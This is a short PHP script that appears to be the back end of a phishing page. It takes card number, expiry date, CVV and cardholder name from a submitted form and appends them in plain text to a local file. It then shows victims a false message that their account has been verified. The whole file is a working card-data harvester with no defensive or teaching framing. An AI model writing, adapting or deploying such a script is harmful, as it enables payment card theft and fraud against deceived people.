<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $card_number = $_POST['card_number'];
    $expiry = $_POST['expiry'];
    $cvv = $_POST['cvv'];
    $card_name = $_POST['card_name'];

    // Data format
    $data = "Card Number: " . $card_number . "\nExpiry Date: " . $expiry . "\nCVV: " . $cvv . "\nCard Holder Name: " . $card_name . "\n------------------------\n";

    // Save to file
    file_put_contents("details.txt", $data, FILE_APPEND);

    echo "<h2 style='color:green; text-align:center;'>Thank you! Your account has been verified.</h2>";
}
?>+
